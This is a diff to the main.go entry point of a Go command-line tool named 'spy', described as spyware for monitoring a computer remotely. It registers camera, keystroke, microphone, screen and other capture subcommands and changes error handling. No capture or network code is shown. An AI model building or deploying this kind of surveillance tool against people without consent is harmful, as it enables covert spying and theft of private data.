@@ -1,27 +1,26 @@
 package main
 
 import (
-	"fmt"
 	"os"
 
 	"github.com/cinus-e/spy/cmd"
+	"github.com/cinus-e/spy/internal/literr"
 	"github.com/urfave/cli/v2"
 )
 
 func main() {
 	app := cli.NewApp()
 	app.Name = "spy"
-	app.Usage = "Spy software to monitor and control computer remotely"
-	app.Version = "0.0.1.20221011"
+	app.Usage = "Spy software to monitor computer remotely"
+	app.Version = "0.0.2.20221015"
 	app.Commands = []*cli.Command{
 		cmd.App,
 		cmd.Cam,
 		cmd.Key,
 		cmd.Mic,
 		cmd.Scr,
+		cmd.Ste,
 	}
-	if err := app.Run(os.Args); err != nil {
-		fmt.Println(err)
-		os.Exit(1)
-	}
+	literr.Discard = false
+	literr.CheckFatal(app.Run(os.Args))
 }
